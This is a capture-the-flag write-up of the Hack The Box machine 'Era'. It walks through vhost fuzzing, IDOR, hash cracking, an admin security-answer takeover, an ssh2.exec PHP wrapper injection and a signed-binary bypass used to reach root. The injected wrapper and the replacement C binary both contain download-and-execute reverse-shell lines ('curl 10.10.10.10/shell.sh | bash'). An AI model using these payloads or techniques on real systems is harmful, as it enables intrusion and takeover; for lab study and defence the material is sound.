---
title: "Era"
---

# Era

![Cap dashboard screenshot](era.png)

Era is a medium Linux Hack The Box machine that starts with vhost discovery and an IDOR in a file storage portal, then moves through a PHP wrapper abuse path and ends with a signed-binary bypass for root.

## Reconnaissance

I started with an Nmap scan of the target.

```bash
nmap -sC -sV -oA nmap/output 10.10.11.0
```

The scan showed FTP and HTTP:

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

The site redirected to `era.htb`, so I added that to `/etc/hosts` and focused on the web app.

![Cap dashboard screenshot](era-1.png)


## VHost Discovery

The main page looked like a design company website with contact information and employee names. Since the host header was already in use, I checked for virtual hosts.

```bash
ffuf -u http://era.htb \
     -H 'Host: FUZZ.era.htb' \
     -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -fs 154
```

That found an additional host:

```text
file
```

I added `file.era.htb` to `/etc/hosts`.

![Cap dashboard screenshot](era-2.png)

## File Portal

The file portal allowed registration through `/register.php`, even though the site did not link to it directly. I created an account and logged in.

After uploading a file, the site returned a download link using a numeric ID, which made the download feature a good candidate for IDOR testing.

```text
http://file.era.htb/download.php?id=2938&dl=true
```

![Cap dashboard screenshot](era-3.png)

I fuzzed the ID parameter while sending my session cookie.

```bash
seq 1 3000 > ids.txt

ffuf -u 'http://file.era.htb/download.php?id=FUZZ&dl=true' \
     -H 'Cookie: PHPSESSID=9ihsfoh7uvrpg2g0i17c0cjotr' \
     -w ids.txt \
     -fs 7686
```

That found valid entries:

```text
54
150
2938
```

Downloading ID `54` gave me a backup archive.

```text
site-backup-30-08-24.zip
```

## Database Extraction

I extracted the archive and found a SQLite database.

```bash
mkdir backup
unzip -d backup site-backup-30-08-24.zip
sqlite3 backup/filedb.sqlite
```

The database contained user records and security answers.

```sql
.headers on
.tables
select * from users;
```

The relevant data was:

```text
admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC|600|Maria|Oliver|Ottawa
eric|$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm|-1
veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK|-1
yuri|$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.|-1
john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|-1
ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|-1
```

I cracked two hashes:

```text
eric:america
yuri:mustang
```

`yuri` also worked for FTP access.

## FTP Files

Logging into FTP exposed two directories:

```bash
ftp era.htb
```

```text
230 Login successful.
```

The interesting directories were:

```text
apache2_conf
php8.1_conf
```

They contained configuration files and shared objects, but nothing immediately useful. The source code of the file storage portal was still the bigger prize.

## Security Reset Abuse

The dashboard included a feature to reset security answers. Reviewing the source showed that the username was not properly validated before being used in the update query.

Relevant code:

```php
$query = "UPDATE users SET security_answer1 = ?, security_answer2 = ?, security_answer3 = ? WHERE user_name = ?";
```

That meant I could overwrite the admin security answers directly.

I reset the answers for `admin_ef01cab31aa` and then logged in successfully using the new answers.

![Cap dashboard screenshot](era-4.png)

## Hidden Download Feature

As admin, I found a hidden feature in `download.php`. Instead of `dl=true`, the admin could use `show=true` and provide a wrapper format.

Relevant logic:

```php
} elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
    $format = isset($_GET['format']) ? $_GET['format'] : '';
    $file = $fetched;

    if (strpos($format, '://') !== false) {
        $wrapper = $format;
        header('Content-Type: application/octet-stream');
    } else {
        $wrapper = '';
        header('Content-Type: text/html');
    }

    $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
}
```

Since the filename was appended to the wrapper, I needed a wrapper that could still execute a local command despite the suffix.

The SSH wrapper fit perfectly because the server had SSH enabled locally. I used a payload like this:

```text
ssh2.exec://yuri:mustang@127.0.0.1:22/curl 10.10.10.10/shell.sh|bash;
```

Then I called `download.php` with a valid file ID, `show=true`, and the wrapper payload. That gave me a shell as `yuri`.

## User Shell

The shell as `yuri` was enough to access the machine, but there was a better privilege path through `eric`.

The password cracked earlier also worked for `eric`, so I switched users.

```bash
su eric
```

```text
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
```

## Signed Binary Abuse

`eric` belonged to a non-default `devs` group. Searching for files owned by that group led me to `/opt/AV`.

```bash
find / -group devs 2>/dev/null
```

That returned:

```text
/opt/AV
/opt/AV/periodic-checks
/opt/AV/periodic-checks/monitor
/opt/AV/periodic-checks/status.log
```

The `monitor` binary was writable by the group, and a cron-like process appeared to run it regularly.

I made a backup of the original binary and compiled my own replacement:

```bash
cp /opt/AV/periodic-checks/monitor /dev/shm/monitor.bak

cat << EOF > deadbeef.c
#include <stdlib.h>

int main() {
    system("curl 10.10.10.10/shell.sh | bash");
    return 0;
}
EOF

gcc -o deadbeef deadbeef.c
cp deadbeef /opt/AV/periodic-checks/monitor
```

That did not work at first. The log showed a signature check failure:

```text
objcopy: /opt/AV/periodic-checks/monitor: can't dump section '.text_sig' - it does not exist: file format not recognized
[ERROR] Executable not signed. Tampering attempt detected. Skipping.
```

Inspecting the original binary revealed a `.text_sig` section.

```bash
objdump --headers monitor.bak
```

```text
27 .text_sig     000001ca  ...
                  CONTENTS, READONLY
```

I extracted the signature section and added it to my new binary.

```bash
objcopy --dump-section .text_sig=text_sig monitor.bak
objcopy --add-section .text_sig=text_sig --set-section-flags .text_sig=code,alloc deadbeef
```

After placing the patched binary back in `/opt/AV/periodic-checks/` and waiting for the periodic job, the root callback arrived.

## Attack Path

- Enumerate the target and identify FTP plus a redirecting HTTP vhost.
- Discover `file.era.htb` with vhost fuzzing.
- Register on the file portal and upload a file.
- Use IDOR to access a backup ZIP.
- Extract the SQLite database and crack user hashes.
- Abuse the security reset functionality to overwrite admin answers.
- Log in as admin and use the hidden `show=true` wrapper feature.
- Leverage the SSH wrapper to execute a command locally and get a shell.
- Switch to `eric` and find the writable signed binary in `/opt/AV`.
- Preserve the `.text_sig` section and patch the malicious binary.
- Wait for the periodic job and receive a root shell.
